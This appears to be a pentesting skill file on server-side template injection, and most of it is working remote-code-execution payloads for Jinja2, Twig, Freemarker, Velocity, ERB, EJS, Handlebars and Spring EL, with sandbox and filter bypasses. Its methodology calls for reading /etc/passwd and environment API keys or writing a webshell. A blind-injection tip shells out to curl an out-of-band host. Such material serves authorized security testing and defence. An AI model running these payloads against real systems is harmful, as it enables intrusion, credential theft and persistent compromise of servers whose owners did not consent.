---
name: ssti
description: Server-side template injection testing covering Jinja2, Twig, Freemarker, Pebble, Mako, ERB, and EL injection with RCE escalation
---

# Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded into a template string and evaluated by the template engine. The impact is almost always Remote Code Execution — the template engine provides a sandboxed language runtime, and the attacker's goal is to break out of it. Any endpoint that renders user-supplied content through a template engine is in scope.

## Attack Surface

**Where SSTI Appears**
- Error pages rendering the requested URL or query parameters
- Email/notification templates with user-controlled fields (name, subject, body)
- CMS/dashboard "custom message" or "preview" features
- Report generators embedding user data into output templates
- PDF/HTML export endpoints
- Search result pages reflecting the search query
- API responses that include dynamic string formatting

**Template Engines by Language**
- Python: Jinja2 (Flask/FastAPI), Mako, Cheetah, Django templates
- PHP: Twig, Smarty, Blade (Laravel), Plates
- Java: Freemarker, Velocity, Pebble, Thymeleaf, Groovy templates
- Ruby: ERB, Liquid, Slim, Haml
- JavaScript: Handlebars, EJS, Pug/Jade, Nunjucks, Mustache
- .NET: Razor, DotLiquid

## Detection

**Polyglot Probe** (causes distinctive errors across all engines)
```
${{<%[%'"}}%\
```
Send this as a parameter value and observe: error messages reveal the engine type; 500 errors without message = likely injection point.

**Mathematical Evaluation Probes** (safe, no side effects)
```
{{7*7}}          → Jinja2, Twig, Nunjucks  (expect: 49)
${7*7}           → Freemarker, Groovy, EL  (expect: 49)
#{7*7}           → Pebble, Spring EL       (expect: 49)
<%= 7*7 %>       → ERB                     (expect: 49)
{{= 7*7 }}       → Plates
*{7*7}           → Spring EL (Thymeleaf)
```

**String Concatenation Probes**
```
{{'a'*5}}        → Jinja2 (expect: aaaaa)
{{'a'~'b'}}      → Twig   (expect: ab)
```

## Engine-Specific RCE Payloads

### Jinja2 (Python)

**Via MRO traversal to subprocess:**
```python
{{''.__class__.__mro__[1].__subclasses__()}}
```
Find the index of `subprocess.Popen` or `os._wrap_close` in the list, then:
```python
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read()}}
```

**Shorter payload via config:**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Using `request` (Flask context):**
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Filter bypass using `|attr()`:**
```python
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
```

**Jinja2 sandbox escape via `cycler`:**
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{{'id'|filter('system')}}
{{app.request.server.get('HTTP_X_FORWARDED_FOR')|split(',')|first|trim|filter('system')}}
```

### Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${product.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
<#assign classloader=product.class.protectionDomain.classLoader>
```

**Using `api_builtin_enabled=true` (default in older versions):**
```java
${.data_model.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(...)}
```

### Velocity (Java)

```java
#set($e = "")
#set($rt = $e.class.forName("java.lang.Runtime"))
#set($ex = $rt.getRuntime().exec("id"))
#set($is = $ex.getInputStream())
#set($sc = $sc.class.forName("java.util.Scanner"))
#set($scanner = $sc.getDeclaredConstructors()[0].newInstance([$is]))
$scanner.useDelimiter("\A").next()
```

### ERB (Ruby)

```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen("id").read %>
<%= require 'open3'; Open3.capture2("id")[0] %>
```

### EJS / Node.js

```javascript
<%= global.process.mainModule.require('child_process').execSync('id') %>
<%- global.process.mainModule.constructor._resolveFilename('child_process') %>
```

### Handlebars (Node.js)

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Pebble / Spring EL

```java
{% set os = "freemarker.template.utility.Execute"?new() %}
{{ os("id") }}

// Spring EL
*{T(java.lang.Runtime).getRuntime().exec('id')}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{105,100})).getInputStream())}
```

## Bypass Techniques

**Jinja2 Sandbox Bypass via String Methods**
When `__class__` and `__mro__` are blocked:
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

**Unicode Bypass**
```python
{{''['\u005f\u005fclass\u005f\u005f']}}
```

**Filter Bypass via `|join` and `|list`**
```python
{{().__class__.__bases__[0].__subclasses__()|map(attribute='__name__')|list}}
```

## Tools

- **tplmap** — Automated SSTI detection and exploitation: `pip install tplmap; tplmap -u "http://target/page?name=test"`
- **semgrep** — Static detection: `semgrep --config=p/flask-ssti`
- **nuclei** — SSTI templates: `nuclei -t nuclei-templates/vulnerabilities/generic/ssti.yaml`
- **interactsh-client** — OOB callback for blind SSTI confirmation: use DNS/HTTP ping payloads

## Testing Methodology

1. Identify all input points that appear in rendered output (search results, error pages, profile fields, email previews, custom messages)
2. Send polyglot probe `${{<%[%'"}}%\` — note error type and engine fingerprint
3. Confirm with mathematical probe: `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`
4. Identify the engine from the working probe and the error messages
5. Escalate to OS command execution using the engine-specific payload above
6. Confirm RCE with `id`, `whoami`, then use `interactsh-client` for OOB callback if response is blind
7. Demonstrate full impact: read `/etc/passwd`, environment variables (API keys), or write a webshell
8. Report with exact injection point, engine version, and reproduction steps

## Pro Tips

- Always check the framework version — Jinja2 sandbox restrictions were tightened in 2.11; Freemarker 2.3.17+ blocks `Execute` by default
- grep source code for `render_template_string`, `env.from_string`, `Template(user_input)` — these are the smoking guns
- Email template fields are frequently overlooked — test name, subject, and any "custom message" fields
- Blind SSTI (no output in response): use DNS OOB via `interactsh-client` — `{{''.__class__.__mro__[1].__subclasses__()[N]('curl http://oob.interactsh.com', shell=True)}}`
- The `tplmap` tool automates engine detection and payload escalation — run it against every suspect parameter
